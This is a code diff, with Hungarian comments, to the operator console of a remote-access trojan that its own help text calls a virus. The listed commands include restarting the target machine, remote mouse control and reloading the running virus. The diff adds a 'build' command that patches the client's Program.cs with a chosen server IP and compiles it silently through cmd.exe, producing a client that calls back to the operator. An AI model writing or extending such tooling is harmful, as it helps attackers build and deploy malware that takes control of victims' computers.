@@ -71,6 +71,7 @@ restart      - újraindítja a gépet
 audio [100]  - beállítja a hangerőt (itt pl 100-ra)
 subcontroller- kezeli (ha van) másik ip címeken futó negnox kliensekre csatlakozást ÷(sc)÷
 reloadclient - újra indítja a már futó vírust
+build [ip]   - lebuildeli a c# virust hogy arra az ip-re csatlakozzon  
 |//lokális parancsok|
 cmdme [asd]  - lefuttat lokálisan egy cmd parancsot
 cdme         - könyvtárat vált ("")
@@ -687,10 +688,67 @@ mouseC       - távolról vezérelhető desktop applikáció       [$célpont sp
                     {
                         Log($"[$!$] [$Console hiba$]");
                     }
+                    break;
+
+                case "buildpayload":
+                case "build":
+                    // cd ..\..\..\nclient
+
+                    Directory.SetCurrentDirectory(localExePath);
+
+                    Directory.SetCurrentDirectory("..\\..\\..\\nclient");
+
+
+
+                    string ip = bemenet;
+                    string path = "Program.cs";
+
+                    string[] lines = File.ReadAllLines(path);
+
+                    lines[112] = $"public static string serverIP = \"{ip}\";";   // 4. sor (index 0-tól indul)
+
+                    File.WriteAllLines(path, lines);
+
+                    texted = "";
+                    try
+                    {
+                        // Parancs
+
+                        // Folyamat beállítása
+                        ProcessStartInfo psi = new ProcessStartInfo();
+                        psi.FileName = "cmd.exe";
+                        psi.Arguments = "/c " + "dotnet build nclient.csproj";  // /c = futtatja, majd bezárja a cmd-t
+                        psi.RedirectStandardOutput = true; // ide fogja irányítani a kimenetet
+                        psi.RedirectStandardError = true;  // hibaüzeneteket is lekérheted
+                        psi.UseShellExecute = false;       // kötelező a redirekcióhoz
+                        psi.CreateNoWindow = true;         // ne nyisson új ablakot
+
+                        // Folyamat indítása
+                        using (Process process = Process.Start(psi))
+                        {
+                            // Kimenet beolvasása
+                            string output = process.StandardOutput.ReadToEnd();
+                            string errors = process.StandardError.ReadToEnd();
+
+                            process.WaitForExit(); // megvárjuk, amíg lefut
+                            Console.WriteLine(output);
+                            texted = output;
+
+                            if (!string.IsNullOrEmpty(errors))
+                            {
+                                texted = errors;
+                            }
+                        }
+                    }
+                    catch (Exception)
+                    {
+                        Log($"[$!$] [$Console hiba$]");
+                    }
+
+
 
 
                     break;
-
 
 
                 case "cls":
